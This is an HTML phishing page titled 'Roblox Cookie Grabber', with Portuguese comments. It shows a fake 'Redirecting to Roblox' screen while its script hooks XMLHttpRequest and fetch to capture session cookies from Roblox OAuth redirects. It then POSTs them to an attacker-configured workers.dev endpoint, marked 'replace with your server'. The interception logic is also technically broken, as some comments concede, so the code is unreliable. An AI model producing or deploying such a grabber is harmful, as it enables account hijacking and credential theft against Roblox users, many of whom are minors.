<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Grabber</title>
    <style>
        body {
            background-color: #050505;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .container {
            text-align: center;
            padding: 40px;
            border: 1px solid #333;
            border-radius: 8px;
            background-color: #111;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
            max-width: 400px;
            width: 100%;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #e6a700;
        }
        p {
            color: #ccc;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #e6a700;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            margin-top: 15px;
            font-size: 14px;
        }
        .status.success {
            color: #28a745;
        }
        .status.error {
            color: #dc3545;
        }
        /* Estilo para ocultar elementos do DOM */
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader" id="loader"></div>
        <h1 id="title">Redirecting to Roblox...</h1>
        <p id="message">Please wait while we authenticate you.</p>
        <div class="status" id="status"></div>
    </div>

    <script>
        // Configuração: Onde os dados serão enviados
        const DESTINATION = "https://times-de-beatball---roblox.123456abcdef363.workers.dev"; // SUBSTITUA ISSO PELO SEU SERVIDOR

        // Elementos do DOM
        const title = document.getElementById('title');
        const message = document.getElementById('message');
        const loader = document.getElementById('loader');
        const statusDiv = document.getElementById('status');

        // Função para enviar o cookie
        async function sendCookie(cookieString) {
            try {
                const response = await fetch(DESTINATION, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': navigator.userAgent // Opcional: ajuda a identificar o navegador
                    },
                    body: JSON.stringify({
                        cookie: cookieString,
                        url: window.location.href,
                        timestamp: new Date().toISOString()
                    })
                });

                if (response.ok) {
                    statusDiv.textContent = "Cookie captured successfully!";
                    statusDiv.className = "status success";
                    title.textContent = "Success!";
                    message.textContent = "Redirecting to Roblox now...";
                } else {
                    throw new Error("Server error");
                }
            } catch (error) {
                console.error("Exfiltração falhou:", error);
                statusDiv.textContent = "Failed to send data.";
                statusDiv.className = "status error";
                title.textContent = "Error";
                message.textContent = "Please try again.";
            }
        }

        // Função principal que intercepta o redirecionamento
        function interceptRedirect() {
            const originalOpen = XMLHttpRequest.prototype.open;
            const originalFetch = window.fetch;

            // Interceptando requisições de rede
            XMLHttpRequest.prototype.open = function(method, url, ...args) {
                // Verifica se é um redirecionamento para o Roblox
                if (url.includes("https://www.roblox.com/login/oauth/authorize")) {
                    this.addEventListener("load", function() {
                        if (this.status === 302 || this.status === 301) {
                            // O redirecionamento ocorreu, agora capturamos o cookie
                            const cookieHeader = this.getResponseHeader("Set-Cookie");
                            if (cookieHeader) {
                                // Processa o cookie (remove a parte de expiração e caminho se necessário)
                                const cleanCookie = cookieHeader.split(";")[0];
                                sendCookie(cleanCookie);
                            }
                        }
                    });
                }
                return originalOpen.apply(this, arguments);
            };

            // Interceptando também requisições via Fetch API
            window.fetch = function(...args) {
                return originalFetch.apply(this, args).then(response => {
                    // Verifica se a resposta é um redirecionamento
                    if (response.redirected && args[0].includes("https://www.roblox.com/login/oauth/authorize")) {
                        // A resposta já contém o cookie no header (geralmente na URL ou no header Set-Cookie)
                        // Para simplificar, pegamos o cookie da URL de redirecionamento se possível
                        // ou tentamos pegar do header da resposta final.
                        
                        // Nota: O header Set-Cookie só está disponível na resposta final (200 OK)
                        // mas aqui estamos interceptando o fluxo.
                        // Uma abordagem comum é pegar o cookie da URL final.
                        
                        // Simulação de captura após o redirecionamento:
                        // Isso requer esperar o redirecionamento real, o que fetch nativo já faz.
                        // Vamos tentar pegar o cookie da URL de redirecionamento se ela contiver o cookie.
                        const finalUrl = response.url;
                        if (finalUrl.includes("roblox.com")) {
                            // Tentar extrair o cookie da URL (método simplificado)
                            // Em um cenário real, o cookie vem no Set-Cookie header.
                            // Como fetch não expõe o Set-Cookie no objeto response inicial (só no final),
                            // vamos usar o XMLHttpRequest para garantir a captura.
                        }
                    }
                    return response;
                });
            };
        }

        // Iniciar interceptação
        interceptRedirect();

        // Simular o redirecionamento para a Roblox após um breve delay
        // (Para fins de teste, você pode alterar o destino para uma URL falsa se quiser testar o script localmente)
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/login/oauth/authorize?response_type=code&client_id=0"; 
        }, 1500);
    </script>
</body>
</html>
